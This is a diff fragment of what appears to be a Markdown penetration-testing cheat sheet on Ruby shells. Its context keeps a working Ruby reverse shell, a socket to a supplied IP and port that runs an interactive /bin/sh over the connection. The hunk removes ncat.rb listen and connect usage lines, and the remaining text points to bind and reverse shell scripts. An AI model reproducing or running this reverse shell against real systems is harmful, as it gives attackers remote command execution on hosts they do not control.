@@ -43,15 +43,6 @@ ip, port = ARGV
 s = TCPSocket.open(ip,port).to_i
 exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
 ```
-- To listen 
-```
-ruby ncat.rb -lvp 443 
-```
-
-- To connect 
-```
-ruby ncat.rb -cv -r RHOST -p 443
-```
 
 ## Bind and Reverse shell 
 This is an awesome implementation for a standalone  [bind][1] and [reverse][2] shells scripts written by [Hood3dRob1n][3] on GitHub . The bind shell requires authentication while reverse is not.
